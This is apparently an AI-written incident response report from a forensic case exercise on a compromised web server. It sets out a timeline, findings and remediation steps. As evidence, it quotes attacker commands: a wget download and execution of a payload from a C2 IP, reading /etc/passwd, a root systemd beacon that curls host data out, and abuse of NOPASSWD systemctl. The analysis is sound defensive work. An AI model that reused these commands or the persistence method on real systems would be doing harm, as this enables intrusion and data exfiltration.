All claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised. An attacker operating from the known C2 server **185.229.59.103** accessed the system through at least two accounts (**www-data** and **deploy**), downloaded and executed a malware payload, and installed a persistent C2 beacon as a systemd service running as root.

## Attack Timeline

| Time | Event | Source |
|------|-------|--------|
| (unknown) | Attacker gains shell as **www-data**, runs recon (`id`, `uname -a`), downloads malware from `http://185.229.59.103/u` to `/tmp/.u`, executes it, reads `/etc/passwd` | `fs/var/www/.bash_history:1-7` |
| Apr 14 03:17:44 | Attacker logs into **deploy** account via SSH publickey from **185.229.59.103** | `auth.log:30` |
| Apr 14 03:18:02 | `deploy` runs `sudo cat /etc/passwd` (account enumeration) | `auth.log:32` |
| Apr 14 03:18:12 | `deploy` copies `/tmp/update` to `/usr/local/bin/update` via sudo | `auth.log:35` |
| Apr 14 03:18:17 | `deploy` makes it executable (`chmod +x`) | `auth.log:36` |
| Apr 14 03:18:29 | `deploy` writes `system-updater.service` to `/etc/systemd/system/` via `sudo tee` | `auth.log:37` |
| Apr 14 03:18:44–03:19:03 | `deploy` runs `daemon-reload`, `enable`, and `start` on the malicious service | `auth.log:38-40` |
| Apr 14 03:20:51 | Attacker disconnects the deploy SSH session | `auth.log:41` |

## Findings

### 1. C2 Beacon Persistence (CONFIRMED)
A malicious systemd unit **system-updater.service** was installed at `etc/systemd/system/system-updater.service`. It runs as root, executing `curl -sX POST https://185.229.59.103:8443/beacon` every 600 seconds, exfiltrating the hostname and IP address. It is set to `WantedBy=multi-user.target`, ensuring it starts on every boot.

### 2. Attacker Activity via www-data (CONFIRMED)
The file `/var/www/.bash_history` (the www-data account) contains 7 commands that constitute a classic post-exploitation sequence:
1. `id` — identify current user/privileges
2. `uname -a` — OS/kernel reconnaissance
3. `cd /tmp` — move to world-writable staging directory
4. `wget http://185.229.59.103/u -O /tmp/.u` — download payload from C2
5. `chmod +x /tmp/.u` — make payload executable
6. `/tmp/.u &` — execute payload in background
7. `cat /etc/passwd` — enumerate local accounts

### 3. Compromised deploy Account (CONFIRMED + INFERENCE)
The attacker logged into the **deploy** account from C2 IP **185.229.59.103** using the same RSA key fingerprint (`SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ`) as the legitimate CI runner at `10.0.1.50`. No brute-force preceded this login — the attacker likely stole the CI runner's SSH private key. The deploy account's `NOPASSWD` sudo access to `/usr/bin/systemctl` (in `etc/sudoers.d/deploy`) gave the attacker the ability to install, enable, and start the malicious systemd service without any password.

### 4. Known-Bad IOC (CONFIRMED)
IP **185.229.59.103** is a known C2 server (high confidence, tagged: c2, beacon). It appears in both the SSH login log and the www-data download history.

### 5. Dangerous Sudoers Configuration (CONFIRMED)
The file `etc/sudoers.d/deploy` grants `deploy ALL=(root) NOPASSWD: /usr/bin/systemctl` — this is a privilege escalation vector because `systemctl` can install and run arbitrary services as root.

## Shell History Analysis

| Account | Location | Commands | Content |
|---------|----------|----------|---------|
| **root** | `fs/root/.bash_history` | 4 | Benign sysadmin: `apt update`, `apt upgrade`, `systemctl restart nginx`, `tail -f /var/log/nginx/error.log` |
| **deploy** | `fs/home/deploy/.bash_history` | 15 | Benign CI/CD dev activity: git operations, npm builds, checking nginx status. The attacker's actions were done via sudo and are recorded in auth.log, not here. |
| **alice** | `fs/home/alice/.bash_history` | 6 | Benign log review: `ls`, `cd /var/log`, `tail` nginx access log, `journalctl`, `systemctl status nginx` |
| **www-data** | `fs/var/www/.bash_history` | 7 | **Attacker activity**: recon, malware download/execution, credential access (see Finding #2) |
| **bob** | (none) | 0 | No shell history file found, despite two successful SSH logins on Apr 13 and Apr 14 |

## Case Questions

**Case Q1:** Shell histories were analyzed for four accounts: **root**, **deploy**, **alice**, and **www-data** (the account associated with `/var/www/.bash_history`). Bob had no shell history file despite logging in twice.

**Case Q2:** Yes — the **www-data** account's shell history (`/var/www/.bash_history`) shows what the attacker did: system reconnaissance (`id`, `uname -a`), downloading a malware payload from the C2 server (`wget http://185.229.59.103/u -O /tmp/.u`), executing it (`/tmp/.u &`), and reading `/etc/passwd`. Additionally, the attacker's actions through the **deploy** account are visible in the **auth.log** sudo records (lines 32–40): reading `/etc/passwd`, copying a binary to `/usr/local/bin/update`, creating and enabling a persistent C2 beacon systemd service (`system-updater.service`), and starting it. Deploy's on-disk `.bash_history` does **not** contain the attacker commands — only the sudo log captured them.

## Recommendations

1. **Immediately** disable and remove `system-updater.service` and delete `/usr/local/bin/update`
2. **Rotate** all SSH keys for the deploy account; revoke the compromised CI runner key
3. **Restrict** deploy's sudoers to specific systemctl subcommands (e.g., `systemctl restart nginx`) rather than bare `systemctl`
4. **Investigate** how www-data obtained a shell — likely a web application vulnerability
5. **Block** C2 IP `185.229.59.103` at the network perimeter
6. **Forensically image** `/tmp/.u` (if still present) for malware analysis